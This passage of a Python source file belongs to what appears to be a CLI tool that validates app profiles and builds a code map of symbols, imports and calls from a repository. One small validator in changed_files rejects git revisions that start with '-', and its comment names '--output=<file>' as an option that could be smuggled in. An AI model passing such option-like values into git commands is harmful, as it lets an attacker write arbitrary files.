#!/usr/bin/env python3
"""Build and query application context, validate profiles, and inspect changes."""

from __future__ import annotations

import argparse
import ast
import hashlib
import fnmatch
import json
import os
import posixpath
import re
import shlex
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path, PurePosixPath
from typing import Any


PROFILE_RELATIVE_PATH = Path(".app-context/profile.json")
RUNS_RELATIVE_PATH = Path(".app-context/runs")
SUPPORTED_SCHEMA_VERSION = 1
APP_ID_PATTERN = re.compile(r"^[a-z0-9]+(?:-[a-z0-9]+)*$")
REPORT_PATH_LIMIT = 100
FEATURE_MATCH_LIMIT = 50
MAP_SCHEMA_VERSION = 1
MAP_RELATIVE_PATH = Path(".app-context/generated/application-map-v1.json")
MAP_QUERY_LIMIT = 100
MAX_IMPACT_DEPTH = 8
IMPACT_TRAVERSAL_LIMIT = 5_000
DEFAULT_IMPACT_EDGE_KINDS = ("calls", "contains", "feature-owns", "imports")
DEFAULT_MAX_RETRIES = 2
# The skill directory (SKILL.md, references/, scripts/), whether run from a clone
# or from the installed `context-guardian-cli` package.
PACKAGE_ROOT = Path(__file__).resolve().parent.parent
# Installed by `uv tool install context-guardian-cli`. Hooks and agent
# instructions call this command by name, so nothing machine-specific is written
# into an application repository.
CLI_COMMAND = "context-guardian"
# Run records are per-turn bookkeeping. Without a bound they accumulate one file
# per prompt for the life of the project.
RUN_RETENTION_SECONDS = 14 * 24 * 3600
RUN_RECORD_LIMIT = 500
MAX_INDEXED_SOURCE_BYTES = 2_000_000
EXCLUDED_DIRECTORY_NAMES = {
    ".git",
    ".hg",
    ".svn",
    ".idea",
    ".vscode",
    "Pods",
    "DerivedData",
    "build",
    "dist",
    "coverage",
    "node_modules",
    "vendor",
}
LANGUAGE_BY_SUFFIX = {
    ".c": "c",
    ".cc": "cpp",
    ".cpp": "cpp",
    ".cs": "csharp",
    ".css": "css",
    ".dart": "dart",
    ".go": "go",
    ".h": "c-header",
    ".hpp": "cpp-header",
    ".html": "html",
    ".java": "java",
    ".js": "javascript",
    ".jsx": "javascript-react",
    ".kt": "kotlin",
    ".kts": "kotlin",
    ".m": "objective-c",
    ".mm": "objective-cpp",
    ".php": "php",
    ".py": "python",
    ".rb": "ruby",
    ".rs": "rust",
    ".scss": "scss",
    ".sh": "shell",
    ".sql": "sql",
    ".swift": "swift",
    ".ts": "typescript",
    ".tsx": "typescript-react",
    ".vue": "vue",
}
SYMBOL_PATTERNS: dict[str, list[tuple[str, re.Pattern[str]]]] = {
    "python": [
        ("class", re.compile(r"^\s*class\s+([A-Za-z_]\w*)")),
        ("function", re.compile(r"^\s*(?:async\s+)?def\s+([A-Za-z_]\w*)\s*\(")),
    ],
    "swift": [
        (
            "type",
            re.compile(
                r"^\s*(?:(?:public|private|internal|fileprivate|open|final)\s+)*"
                r"(?:class|struct|enum|protocol|actor|extension)\s+([A-Za-z_]\w*)"
            ),
        ),
        (
            "function",
            re.compile(
                r"^\s*(?:(?:public|private|internal|fileprivate|open|static|class|mutating)\s+)*"
                r"func\s+([A-Za-z_]\w*)\s*\("
            ),
        ),
    ],
    "kotlin": [
        (
            "type",
            re.compile(
                r"^\s*(?:(?:public|private|internal|protected|data|sealed|open|abstract)\s+)*"
                r"(?:class|interface|object|enum\s+class)\s+([A-Za-z_]\w*)"
            ),
        ),
        (
            "function",
            re.compile(
                r"^\s*(?:(?:public|private|internal|protected|suspend|inline|operator)\s+)*"
                r"fun\s+(?:<[^>]+>\s*)?([A-Za-z_]\w*)\s*\("
            ),
        ),
    ],
    "java": [
        (
            "type",
            re.compile(
                r"^\s*(?:(?:public|private|protected|static|final|abstract)\s+)*"
                r"(?:class|interface|enum|record)\s+([A-Za-z_]\w*)"
            ),
        ),
    ],
    "javascript": [],
    "javascript-react": [],
    "typescript": [],
    "typescript-react": [],
}
JS_SYMBOL_PATTERNS = [
    (
        "type",
        re.compile(
            r"^\s*(?:export\s+(?:default\s+)?)?(?:abstract\s+)?"
            r"(?:class|interface|type|enum)\s+([A-Za-z_$][\w$]*)"
        ),
    ),
    (
        "function",
        re.compile(
            r"^\s*(?:export\s+(?:default\s+)?)?(?:async\s+)?function\s+"
            r"([A-Za-z_$][\w$]*)\s*\("
        ),
    ),
    (
        "binding",
        re.compile(
            r"^\s*(?:export\s+)?(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*="
        ),
    ),
]
CALL_PATTERN = re.compile(r"\b([A-Za-z_$][\w$]*)\s*\(")
CALL_KEYWORDS = {
    "catch",
    "class",
    "def",
    "else",
    "for",
    "func",
    "function",
    "if",
    "new",
    "return",
    "sizeof",
    "super",
    "switch",
    "while",
}
JS_RESOLUTION_SUFFIXES = (
    ".ts",
    ".tsx",
    ".js",
    ".jsx",
    ".mjs",
    ".cjs",
    ".json",
)


class ProfileError(ValueError):
    """Raised when an application profile violates the shared contract."""


class MapError(ValueError):
    """Raised when an application map cannot be built, loaded, or queried."""


class LifecycleError(ValueError):
    """Raised when task baseline, run state, or lifecycle operation fails."""


def require_string(value: Any, field: str) -> str:
    if not isinstance(value, str) or not value.strip():
        raise ProfileError(f"{field} must be a non-empty string")
    return value


def require_string_list(value: Any, field: str, *, allow_empty: bool = True) -> list[str]:
    if not isinstance(value, list) or (not allow_empty and not value):
        qualifier = "non-empty " if not allow_empty else ""
        raise ProfileError(f"{field} must be a {qualifier}array")
    for item in value:
        require_string(item, f"{field}[]")
    return value


def validate_profile(profile: dict[str, Any]) -> None:
    if profile.get("schema_version") != SUPPORTED_SCHEMA_VERSION:
        raise ProfileError(
            f"schema_version must be {SUPPORTED_SCHEMA_VERSION}; "
            f"got {profile.get('schema_version')!r}"
        )
    app_id = require_string(profile.get("app_id"), "app_id")
    if not APP_ID_PATTERN.fullmatch(app_id):
        raise ProfileError("app_id must contain lowercase letters, digits, and hyphens only")
    require_string(profile.get("display_name"), "display_name")
    features = profile.get("features")
    if not isinstance(features, list):
        raise ProfileError("features must be an array")

    seen: set[str] = set()
    for index, feature in enumerate(features):
        prefix = f"features[{index}]"
        if not isinstance(feature, dict):
            raise ProfileError(f"{prefix} must be an object")
        feature_id = require_string(feature.get("id"), f"{prefix}.id")
        if feature_id in seen:
            raise ProfileError(f"duplicate feature id: {feature_id}")
        seen.add(feature_id)
        require_string_list(feature.get("triggers"), f"{prefix}.triggers", allow_empty=False)
        require_string_list(feature.get("references"), f"{prefix}.references", allow_empty=False)
        for optional in ("invariants", "validation", "depends_on"):
            if optional in feature:
                require_string_list(feature[optional], f"{prefix}.{optional}")

    for index, feature in enumerate(features):
        for dep in feature.get("depends_on", []):
            if dep not in seen:
                raise ProfileError(f"features[{index}].depends_on contains unknown feature id: {dep}")
            if dep == feature.get("id"):
                raise ProfileError(f"features[{index}].depends_on cannot depend on itself: {dep}")

    if "global_invariants" in profile:
        require_string_list(profile["global_invariants"], "global_invariants")
    if "intentional_differences" in profile:
        require_string_list(profile["intentional_differences"], "intentional_differences")
    if "stacks" in profile:
        require_string_list(profile["stacks"], "stacks")
    if "hooks" in profile:
        hooks = profile["hooks"]
        if not isinstance(hooks, dict):
            raise ProfileError("hooks must be an object")
        for flag in ("preflight",):
            if flag in hooks and not isinstance(hooks[flag], bool):
                raise ProfileError(f"hooks.{flag} must be a boolean")
    if "map" in profile:
        map_options = profile["map"]
        if not isinstance(map_options, dict):
            raise ProfileError("map must be an object")
        if "auto_refresh" in map_options and not isinstance(map_options["auto_refresh"], bool):
            raise ProfileError("map.auto_refresh must be a boolean")
    if "commands" in profile:
        commands = profile["commands"]
        if not isinstance(commands, dict):
            raise ProfileError("commands must be an object")
        for cmd_type in ("quick", "full", "trusted"):
            if cmd_type in commands:
                require_string_list(commands[cmd_type], f"commands.{cmd_type}")


def load_profile(project: Path) -> dict[str, Any]:
    profile_path = project / PROFILE_RELATIVE_PATH
    if not profile_path.is_file():
        raise ProfileError(f"profile not found: {profile_path}")
    try:
        value = json.loads(profile_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise ProfileError(f"cannot read profile: {exc}") from exc
    if not isinstance(value, dict):
        raise ProfileError("profile root must be a JSON object")
    validate_profile(value)
    return value


def git_output(project: Path, args: list[str]) -> list[str]:
    process = subprocess.run(
        ["git", "-C", str(project), *args],
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
    )
    if process.returncode != 0:
        return []
    return [line.strip() for line in process.stdout.splitlines() if line.strip()]


def _protected_path(path: str | Path) -> bool:
    """One lexical discovery rule; project tokens are supplied by its wrapper."""
    parts = Path(str(path).replace("\\", "/")).parts
    try:
        tokens = json.loads(os.environ.get("CONTEXT_GUARD_PROTECTED_COMPONENT_SUBSTRINGS", "[]"))
    except ValueError:
        tokens = None
    if not isinstance(tokens, list) or any(not isinstance(x, str) or not x for x in tokens):
        raise MapError(
            "CONTEXT_GUARD_PROTECTED_COMPONENT_SUBSTRINGS must be a JSON list of non-empty strings"
        )
    return any(part.casefold() == ".app-context" or
               any(token.casefold() in part.casefold() for token in tokens) for part in parts)


def _safe_repository_path(project: Path, relative: str) -> bool:
    path = Path(relative.replace("\\", "/"))
    if path.is_absolute() or ".." in path.parts or _protected_path(path):
        return False
    if any(part in EXCLUDED_DIRECTORY_NAMES for part in path.parts):
        return False
    candidate = project / path
    # Do not resolve or inspect link targets; discard every symlink component.
    for parent in (candidate, *candidate.parents):
        if parent == project:
            break
        if parent.is_symlink():
            return False
    return True


def _is_task_relevant_path(path: str) -> bool:
    if _protected_path(path):
        return False
    normalized = path.replace("\\", "/")
    # Machine-written bookkeeping is not a task change. Leaving findings.json in
    # made the watcher notice its own output: each scan rewrote the file, the
    # rewritten file became a changed path, the changed path changed the
    # finding's fingerprint, and a quiet project produced a new finding every
    # twenty seconds forever. Hand-written context (profile.json, invariants,
    # features) stays relevant -- editing an invariant is a real change.
    if normalized in (".app-context/findings.json", ".app-context/watcher.json"):
        return False
    if normalized.startswith(".app-context/runs/") or normalized.startswith(".app-context/generated/"):
        return False
    parts = Path(normalized).parts
    if any(part in EXCLUDED_DIRECTORY_NAMES for part in parts):
        return False
    return True


def _sha256_file(path: Path) -> str | None:
    if ".." in path.parts or _protected_path(path) or any(p.is_symlink() for p in (path, *path.parents)):
        return None
    if not path.is_file():
        return None
    hasher = hashlib.sha256()
    try:
        with path.open("rb") as f:
            while chunk := f.read(65536):
                hasher.update(chunk)
        return hasher.hexdigest()
    except OSError:
        return None


def changed_files(project: Path, base: str | None) -> list[str]:
    paths: set[str] = set()
    if base:
        # A base starting with "-" would be read by git as an option
        # (`--output=<file>` writes a file).
        if base.startswith("-") or not re.match(r"^[\w./@^~{}:+-]+$", base):
            raise MapError(f"invalid --base revision: {base!r}")
        paths.update(git_output(project, ["diff", "--name-only", f"{base}...HEAD"]))
    paths.update(git_output(project, ["diff", "--name-only", "HEAD"]))
    paths.update(git_output(project, ["ls-files", "--others", "--exclude-standard"]))
    return sorted(path for path in paths if _is_task_relevant_path(path))


def _git_file_inventory(project: Path) -> list[str] | None:
    process = subprocess.run(
        [
            "git",
            "-C",
            str(project),
            "ls-files",
            "--cached",
            "--others",
            "--exclude-standard",
            "-z",
        ],
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if process.returncode != 0:
        return None
    return sorted(
        value.decode("utf-8", errors="surrogateescape")
        for value in process.stdout.split(b"\0")
        if value
    )


def _filesystem_inventory(project: Path) -> list[str]:
    paths: list[str] = []
    for root, directory_names, file_names in os.walk(project):
        directory_names[:] = sorted(
            name for name in directory_names if name not in EXCLUDED_DIRECTORY_NAMES
            and not _protected_path(name) and not (Path(root) / name).is_symlink()
        )
        root_path = Path(root)
        for name in sorted(file_names):
            if _protected_path(name):
                continue
            path = root_path / name
            if path.is_symlink():
                continue
            try:
                relative = path.relative_to(project).as_posix()
            except ValueError:
                continue
            paths.append(relative)
    return sorted(paths)


def repository_files(project: Path) -> tuple[list[str], str]:
    if not project.is_dir():
        raise MapError(f"project directory not found: {project}")
    git_paths = _git_file_inventory(project)
    paths = git_paths if git_paths is not None else _filesystem_inventory(project)
    filtered = [
        path
        for path in paths
        if _safe_repository_path(project, path) and (project / path).is_file()
    ]
    return sorted(set(filtered)), "git" if git_paths is not None else "filesystem"


def infer_role(path: str) -> str:
    lowered_parts = [part.lower() for part in Path(path).parts]
    name = Path(path).name.lower()
    if any(part in {"test", "tests", "__tests__", "spec", "specs"} for part in lowered_parts):
        return "test"
    if any(token in name for token in (".test.", ".spec.", "test_", "_test.")):
        return "test"
    if any(part in {"scripts", "tools", "bin"} for part in lowered_parts):
        return "tooling"
    if any(part in {"assets", "images", "fonts", "public", "resources"} for part in lowered_parts):
        return "asset"
    if Path(path).suffix.lower() in LANGUAGE_BY_SUFFIX:
        return "source"
    if name in {
        "package.json",
        "app.json",
        "podfile",
        "gemfile",
        "cargo.toml",
        "go.mod",
        "build.gradle",
        "settings.gradle",
    } or Path(path).suffix.lower() in {".json", ".toml", ".yaml", ".yml", ".xml"}:
        return "configuration"
    return "other"


def extract_symbols_python_ast(text: str, path: str) -> list[dict[str, Any]]:
    tree = ast.parse(text, filename=path)
    symbols: list[dict[str, Any]] = []

    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            kind = (
                "class"
                if isinstance(node, ast.ClassDef)
                else ("async_function" if isinstance(node, ast.AsyncFunctionDef) else "function")
            )
            name = node.name
            line = getattr(node, "lineno", 1)
            col = getattr(node, "col_offset", 0)
            end_line = getattr(node, "end_lineno", line)

            bases: list[str] = []
            if isinstance(node, ast.ClassDef):
                for b in node.bases:
                    if isinstance(b, ast.Name):
                        bases.append(b.id)
                    elif isinstance(b, ast.Attribute):
                        bases.append(b.attr)

            decorators: list[str] = []
            for d in node.decorator_list:
                if isinstance(d, ast.Name):
                    decorators.append(d.id)
                elif isinstance(d, ast.Attribute):
                    decorators.append(d.attr)
                elif isinstance(d, ast.Call):
                    if isinstance(d.func, ast.Name):
                        decorators.append(d.func.id)
                    elif isinstance(d.func, ast.Attribute):
                        decorators.append(d.func.attr)

            sym: dict[str, Any] = {
                "id": f"symbol:{path}:{kind}:{name}:{line}",
                "kind": "symbol",
                "symbol_kind": kind,
                "name": name,
                "path": path,
                "line": line,
                "column": col,
                "end_line": end_line,
                "language": "python",
                "confidence": "exact",
                "analyzer": "python-ast@1",
            }
            if bases:
                sym["bases"] = bases
            if decorators:
                sym["decorators"] = decorators
            symbols.append(sym)

    return sorted(symbols, key=lambda s: (s["line"], s["name"]))


def extract_imports_python_ast(text: str, path: str) -> list[dict[str, Any]]:
    tree = ast.parse(text, filename=path)
    edges: list[dict[str, Any]] = []

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                specifier = alias.name
                line = getattr(node, "lineno", 1)
                bindings = [{"imported": alias.name, "local": alias.asname or alias.name}]
                edges.append(
                    {
                        "kind": "imports",
                        "from": f"file:{path}",
                        "to": f"module:{specifier}",
                        "specifier": specifier,
                        "path": path,
                        "line": line,
                        "language": "python",
                        "bindings": bindings,
                        "resolved": False,
                        "confidence": "exact",
                        "analyzer": "python-ast@1",
                    }
                )
        elif isinstance(node, ast.ImportFrom):
            level = getattr(node, "level", 0)
            module = getattr(node, "module", "") or ""
            specifier = ("." * level) + module
            line = getattr(node, "lineno", 1)
            bindings = []
            for alias in node.names:
                if alias.name != "*":
                    bindings.append({"imported": alias.name, "local": alias.asname or alias.name})
            edges.append(
                {
                    "kind": "imports",
                    "from": f"file:{path}",
                    "to": f"module:{specifier}",
                    "specifier": specifier,
                    "path": path,
                    "line": line,
                    "language": "python",
                    "bindings": bindings,
                    "resolved": False,
                    "confidence": "exact",
                    "analyzer": "python-ast@1",
                }
            )

    return sorted(edges, key=lambda e: (e["line"], e["specifier"]))


def extract_symbols(text: str, language: str, path: str) -> list[dict[str, Any]]:
    if language == "python":
        try:
            return extract_symbols_python_ast(text, path)
        except Exception:
            pass

    patterns = (
        JS_SYMBOL_PATTERNS
        if language
        in {
            "javascript",
            "javascript-react",
            "typescript",
            "typescript-react",
        }
        else SYMBOL_PATTERNS.get(language, [])
    )
    symbols: list[dict[str, Any]] = []
    seen: set[tuple[str, str, int]] = set()
    for line_number, line in enumerate(text.splitlines(), start=1):
        for kind, pattern in patterns:
            match = pattern.search(line)
            if not match:
                continue
            name = match.group(1)
            identity = (kind, name, line_number)
            if identity in seen:
                continue
            seen.add(identity)
            symbols.append(
                {
                    "id": f"symbol:{path}:{kind}:{name}:{line_number}",
                    "kind": "symbol",
                    "symbol_kind": kind,
                    "name": name,
                    "path": path,
                    "line": line_number,
                    "column": len(line) - len(line.lstrip()),
                    "language": language,
                    "confidence": "inferred",
                    "analyzer": "regex-symbols@1",
                }
            )
            break
    return symbols


def extract_imports(text: str, language: str, path: str) -> list[dict[str, Any]]:
    if language == "python":
        try:
            return extract_imports_python_ast(text, path)
        except Exception:
            pass

    import_patterns: list[re.Pattern[str]]
    if language in {"javascript", "javascript-react", "typescript", "typescript-react"}:
        import_patterns = [
            re.compile(r"\bfrom\s+['\"]([^'\"]+)['\"]"),
            re.compile(r"\brequire\(\s*['\"]([^'\"]+)['\"]\s*\)"),
            re.compile(r"^\s*import\s+['\"]([^'\"]+)['\"]"),
        ]
    elif language == "python":
        import_patterns = [
            re.compile(r"^\s*from\s+([.\w]+)\s+import\s+"),
            re.compile(r"^\s*import\s+([.\w]+)"),
        ]
    elif language in {"swift", "kotlin", "java"}:
        import_patterns = [re.compile(r"^\s*import\s+([\w.]+)")]
    else:
        return []

    edges: list[dict[str, Any]] = []
    seen: set[tuple[str, int]] = set()
    for line_number, line in enumerate(text.splitlines(), start=1):
        for pattern in import_patterns:
            match = pattern.search(line)
            if not match:
                continue
            specifier = match.group(1)
            identity = (specifier, line_number)
            if identity in seen:
                continue
            seen.add(identity)
            bindings = extract_import_bindings(line, language)
            edges.append(
                {
                    "kind": "imports",
                    "from": f"file:{path}",
                    "to": f"module:{specifier}",
                    "specifier": specifier,
                    "path": path,
                    "line": line_number,
                    "language": language,
                    "bindings": bindings,
                    "resolved": False,
                    "confidence": "exact",
                    "analyzer": "lexical-imports@1",
                }
            )
            break
    return edges


def extract_import_bindings(line: str, language: str) -> list[dict[str, str]]:
    bindings: list[dict[str, str]] = []
    if language in {"javascript", "javascript-react", "typescript", "typescript-react"}:
        from_match = re.search(r"^\s*import\s+(.+?)\s+from\s+['\"]", line)
        if from_match:
            clause = from_match.group(1).strip()
            named_match = re.search(r"\{([^}]*)\}", clause)
            if named_match:
                for item in named_match.group(1).split(","):
                    parts = re.split(r"\s+as\s+", item.strip())
                    if parts and parts[0]:
                        bindings.append(
                            {
                                "imported": parts[0],
                                "local": parts[-1],
                            }
                        )
            namespace_match = re.search(r"\*\s+as\s+([A-Za-z_$][\w$]*)", clause)
            if namespace_match:
                bindings.append(
                    {"imported": "*", "local": namespace_match.group(1)}
                )
            default_clause = clause.split(",", 1)[0].strip()
            if default_clause and not default_clause.startswith(("{", "*")):
                bindings.append({"imported": "default", "local": default_clause})
        require_named = re.search(
            r"\{([^}]*)\}\s*=\s*require\(\s*['\"]", line
        )
        if require_named:
            for item in require_named.group(1).split(","):
                parts = [part.strip() for part in item.split(":", 1)]
                if parts and parts[0]:
                    bindings.append({"imported": parts[0], "local": parts[-1]})

    elif language == "python":
        from_match = re.search(r"^\s*from\s+[.\w]+\s+import\s+(.+)$", line)
        if from_match:
            clause = from_match.group(1).strip().strip("()")
            for item in clause.split(","):
                parts = re.split(r"\s+as\s+", item.strip())
                if parts and parts[0] and parts[0] != "*":
                    bindings.append({"imported": parts[0], "local": parts[-1]})

    unique = {(item["imported"], item["local"]): item for item in bindings}
    return [unique[key] for key in sorted(unique)]


def _unique_existing(candidates: list[str], file_paths: set[str]) -> str | None:
    existing = sorted({candidate for candidate in candidates if candidate in file_paths})
    return existing[0] if len(existing) == 1 else None


def resolve_import_target(
    importer_path: str, specifier: str, language: str, file_paths: set[str]
) -> str | None:
    importer_parent = PurePosixPath(importer_path).parent.as_posix()
    if language in {"javascript", "javascript-react", "typescript", "typescript-react"}:
        if not specifier.startswith("."):
            return None
        base = posixpath.normpath(posixpath.join(importer_parent, specifier))
        candidates = [base]
        if PurePosixPath(base).suffix:
            return _unique_existing(candidates, file_paths)
        candidates.extend(f"{base}{suffix}" for suffix in JS_RESOLUTION_SUFFIXES)
        candidates.extend(
            f"{base}/index{suffix}" for suffix in JS_RESOLUTION_SUFFIXES
        )
        return _unique_existing(candidates, file_paths)

    if language == "python":
        leading_dots = len(specifier) - len(specifier.lstrip("."))
        module = specifier[leading_dots:]
        if leading_dots:
            base_parent = importer_parent
            for _ in range(max(0, leading_dots - 1)):
                base_parent = posixpath.dirname(base_parent)
            module_path = module.replace(".", "/")
            base = posixpath.normpath(
                posixpath.join(base_parent, module_path) if module_path else base_parent
            )
            return _unique_existing(
                [f"{base}.py", f"{base}/__init__.py"], file_paths
            )

        module_path = specifier.replace(".", "/")
        exact = _unique_existing(
            [f"{module_path}.py", f"{module_path}/__init__.py"], file_paths
        )
        if exact:
            return exact
        suffixes = (f"/{module_path}.py", f"/{module_path}/__init__.py")
        return _unique_existing(
            [path for path in file_paths if path.endswith(suffixes)], file_paths
        )

    if language in {"kotlin", "java"}:
        module_path = specifier.replace(".", "/")
        suffixes = (f"/{module_path}.kt", f"/{module_path}.java")
        candidates = [
            path
            for path in file_paths
            if path in {f"{module_path}.kt", f"{module_path}.java"}
            or path.endswith(suffixes)
        ]
        return _unique_existing(candidates, file_paths)
    return None


def resolve_import_edges(
    edges: list[dict[str, Any]], file_paths: set[str]
) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    resolved_edges: list[dict[str, Any]] = []
    gaps: list[dict[str, Any]] = []
    for edge in edges:
        if edge.get("kind") != "imports":
            resolved_edges.append(edge)
            continue
        resolved = resolve_import_target(
            edge["path"], edge["specifier"], edge.get("language", ""), file_paths
        )
        updated = dict(edge)
        if resolved:
            updated.update(
                {
                    "to": f"file:{resolved}",
                    "resolved": True,
                    "confidence": "inferred",
                    "analyzer": "static-import-resolver@1",
                }
            )
        elif edge["specifier"].startswith("."):
            gaps.append(
                {
                    "code": "unresolved-local-import",
                    "path": edge["path"],
                    "line": edge["line"],
                    "specifier": edge["specifier"],
                }
            )
        resolved_edges.append(updated)
    return resolved_edges, gaps


def extract_call_sites(
    text: str, path: str, symbols: list[dict[str, Any]]
) -> list[dict[str, Any]]:
    declarations = {(symbol["name"], symbol["line"]) for symbol in symbols}
    calls: list[dict[str, Any]] = []
    for line_number, line in enumerate(text.splitlines(), start=1):
        for match in CALL_PATTERN.finditer(line):
            name = match.group(1)
            if name in CALL_KEYWORDS or (name, line_number) in declarations:
                continue
            calls.append(
                {
                    "name": name,
                    "path": path,
                    "line": line_number,
                    "column": match.start(1),
                }
            )
    return calls


def _caller_symbol(
    symbols: list[dict[str, Any]], line: int, column: int
) -> tuple[str, str]:
    same_line = [symbol for symbol in symbols if symbol["line"] == line]
    if same_line:
        caller = max(same_line, key=lambda symbol: symbol["column"])
        return caller["id"], "same-line-declaration"
    preceding = [
        symbol
        for symbol in symbols
        if symbol["line"] < line and symbol["column"] < column
    ]
    if not preceding:
        return "", "file"
    caller = max(preceding, key=lambda symbol: (symbol["line"], symbol["column"]))
    return caller["id"], "nearest-containing-indentation"


def build_call_edges(
    source_texts: dict[str, str],
    symbols_by_path: dict[str, list[dict[str, Any]]],
    import_edges: list[dict[str, Any]],
) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    imported_symbols: dict[str, list[tuple[str, str, str]]] = {}
    for edge in import_edges:
        if edge.get("kind") == "imports" and edge.get("resolved"):
            imported_path = str(edge["to"]).removeprefix("file:")
            for binding in edge.get("bindings", []):
                imported_symbols.setdefault(edge["path"], []).append(
                    (binding["local"], binding["imported"], imported_path)
                )

    call_edges: list[dict[str, Any]] = []
    ambiguity_counts: dict[str, int] = {}
    for path, text in source_texts.items():
        local_symbols = symbols_by_path.get(path, [])
        for call in extract_call_sites(text, path, local_symbols):
            name = call["name"]
            candidates = [symbol for symbol in local_symbols if symbol["name"] == name]
            evidence = "same-file-symbol"
            if not candidates:
                candidates = [
                    symbol
                    for local_name, imported_name, imported_path in imported_symbols.get(
                        path, []
                    )
                    for symbol in symbols_by_path.get(imported_path, [])
                    if local_name == name and symbol["name"] == imported_name
                ]
                evidence = "resolved-import-symbol"
            unique_targets = {candidate["id"]: candidate for candidate in candidates}
            if len(unique_targets) != 1:
                if len(unique_targets) > 1:
                    ambiguity_counts[path] = ambiguity_counts.get(path, 0) + 1
                continue
            target = next(iter(unique_targets.values()))
            caller_id, caller_evidence = _caller_symbol(
                local_symbols, call["line"], call["column"]
            )
            call_edges.append(
                {
                    "kind": "calls",
                    "from": caller_id or f"file:{path}",
                    "to": target["id"],
                    "name": name,
                    "path": path,
                    "line": call["line"],
                    "column": call["column"],
                    "resolved": True,
                    "evidence": evidence,
                    "caller_evidence": caller_evidence,
                    "confidence": "inferred",
                    "analyzer": "lexical-call-resolver@1",
                }
            )

    gaps = [
        {"code": "ambiguous-call-targets", "path": path, "count": count}
        for path, count in sorted(ambiguity_counts.items())
    ]
    return call_edges, gaps


def _optional_profile(project: Path) -> tuple[dict[str, Any] | None, list[dict[str, str]]]:
    profile_path = project / PROFILE_RELATIVE_PATH
    if not profile_path.exists():
        return None, []
    try:
        return load_profile(project), []
    except ProfileError as exc:
        return None, [{"code": "invalid-profile", "message": str(exc)}]


def build_application_map(project: Path) -> dict[str, Any]:
    project = project.expanduser().resolve()
    files, inventory_source = repository_files(project)
    profile, gaps = _optional_profile(project)
    nodes: list[dict[str, Any]] = []
    edges: list[dict[str, Any]] = []
    source_texts: dict[str, str] = {}
    symbols_by_path: dict[str, list[dict[str, Any]]] = {}
    content_hash = hashlib.sha256()

    git_commit = None
    try:
        commit_lines = git_output(project, ["rev-parse", "HEAD"])
        if commit_lines:
            git_commit = commit_lines[0]
    except Exception:
        pass

    for relative in files:
        if not _safe_repository_path(project, relative):
            continue
        source_path = project / relative
        if source_path.is_symlink():
            try:
                link_target = os.readlink(source_path)
            except OSError as exc:
                gaps.append(
                    {"code": "unreadable-symlink", "path": relative, "message": str(exc)}
                )
                continue
            nodes.append(
                {
                    "id": f"file:{relative}",
                    "kind": "file",
                    "path": relative,
                    "role": "symlink",
                    "language": None,
                    "bytes": len(link_target.encode("utf-8", errors="surrogateescape")),
                    "content_sha256": hashlib.sha256(
                        link_target.encode("utf-8", errors="surrogateescape")
                    ).hexdigest(),
                    "confidence": "exact",
                    "analyzer": "generic-inventory@1",
                }
            )
            gaps.append({"code": "symlink-content-not-followed", "path": relative})
            continue
        try:
            raw = source_path.read_bytes()
        except OSError as exc:
            gaps.append({"code": "unreadable-file", "path": relative, "message": str(exc)})
            continue
        digest = hashlib.sha256(raw).hexdigest()
        content_hash.update(relative.encode("utf-8", errors="surrogateescape"))
        content_hash.update(b"\0")
        content_hash.update(digest.encode("ascii"))
        language = LANGUAGE_BY_SUFFIX.get(source_path.suffix.lower())
        role = infer_role(relative)
        nodes.append(
            {
                "id": f"file:{relative}",
                "kind": "file",
                "path": relative,
                "role": role,
                "language": language,
                "bytes": len(raw),
                "content_sha256": digest,
                "confidence": "exact",
                "analyzer": "generic-inventory@1",
            }
        )

        if role != "source" or language is None:
            continue
        if len(raw) > MAX_INDEXED_SOURCE_BYTES:
            gaps.append(
                {
                    "code": "source-too-large",
                    "path": relative,
                    "bytes": len(raw),
                }
            )
            continue
        try:
            text = raw.decode("utf-8")
        except UnicodeDecodeError:
            gaps.append({"code": "non-utf8-source", "path": relative})
            continue
        symbols = extract_symbols(text, language, relative)
        source_texts[relative] = text
        symbols_by_path[relative] = symbols
        nodes.extend(symbols)
        edges.extend(
            {
                "kind": "contains",
                "from": f"file:{relative}",
                "to": symbol["id"],
                "path": relative,
                "line": symbol["line"],
                "confidence": "exact",
                "analyzer": "generic-inventory@1",
            }
            for symbol in symbols
        )
        edges.extend(extract_imports(text, language, relative))

    file_paths = {
        node["path"] for node in nodes if node.get("kind") == "file"
    }
    edges, import_gaps = resolve_import_edges(edges, file_paths)
    gaps.extend(import_gaps)
    call_edges, call_gaps = build_call_edges(source_texts, symbols_by_path, edges)
    edges.extend(call_edges)
    gaps.extend(call_gaps)

    if profile is not None:
        for feature in profile["features"]:
            feature_id = f"feature:{feature['id']}"
            nodes.append(
                {
                    "id": feature_id,
                    "kind": "feature",
                    "name": feature["id"],
                    "confidence": "curated",
                    "analyzer": "application-profile@1",
                }
            )
            for node in nodes:
                if node.get("kind") != "file":
                    continue
                matched_pattern = next(
                    (
                        pattern
                        for pattern in feature["triggers"]
                        if path_matches(node["path"], pattern)
                    ),
                    None,
                )
                if matched_pattern:
                    edges.append(
                        {
                            "kind": "feature-owns",
                            "from": feature_id,
                            "to": node["id"],
                            "path": node["path"],
                            "evidence": matched_pattern,
                            "confidence": "curated",
                            "analyzer": "application-profile@1",
                        }
                    )

    kind_counts: dict[str, int] = {}
    language_counts: dict[str, int] = {}
    edge_counts: dict[str, int] = {}
    for node in nodes:
        kind_counts[node["kind"]] = kind_counts.get(node["kind"], 0) + 1
        language = node.get("language")
        if node["kind"] == "file" and language:
            language_counts[language] = language_counts.get(language, 0) + 1
    for edge in edges:
        edge_counts[edge["kind"]] = edge_counts.get(edge["kind"], 0) + 1

    return {
        "schema_version": MAP_SCHEMA_VERSION,
        "generator": "context-guardian@1",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "git_commit": git_commit,
        "project_root": ".",
        "project_content_sha256": content_hash.hexdigest(),
        "inventory_source": inventory_source,
        "profile_app_id": profile["app_id"] if profile else None,
        "summary": {
